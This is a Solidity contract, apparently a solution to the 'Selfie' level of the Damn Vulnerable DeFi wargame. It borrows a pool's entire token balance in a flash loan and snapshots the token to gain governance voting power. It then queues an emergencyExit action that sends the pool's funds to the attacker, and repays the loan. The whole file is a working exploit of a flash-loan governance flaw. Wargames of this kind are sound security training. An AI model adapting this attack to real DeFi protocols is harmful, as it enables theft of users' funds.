// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {IERC3156FlashBorrower, ERC20Snapshot, SelfiePool} from "./SelfiePool.sol";
import {DamnValuableTokenSnapshot} from "../DamnValuableTokenSnapshot.sol";

contract SelfiePoolAttack is IERC3156FlashBorrower {
    SelfiePool private immutable _SELFIE_POOL;
    bytes32 private constant CALLBACK_SUCCESS = keccak256("ERC3156FlashBorrower.onFlashLoan");

    constructor(address selfiePool) {
        _SELFIE_POOL = SelfiePool(selfiePool);
    }

    function onFlashLoan(address, address token, uint256 amount, uint256, bytes calldata) external returns (bytes32) {
        DamnValuableTokenSnapshot(token).snapshot();
        _SELFIE_POOL.governance().queueAction(
            address(_SELFIE_POOL), 0, abi.encodeWithSelector(_SELFIE_POOL.emergencyExit.selector, tx.origin)
        );
        ERC20Snapshot(token).approve(address(_SELFIE_POOL), amount);
        return CALLBACK_SUCCESS;
    }

    function attack() public payable {
        address token = address(_SELFIE_POOL.token());
        uint256 amount = _SELFIE_POOL.maxFlashLoan(token);
        _SELFIE_POOL.flashLoan(this, token, amount, "");
    }
}
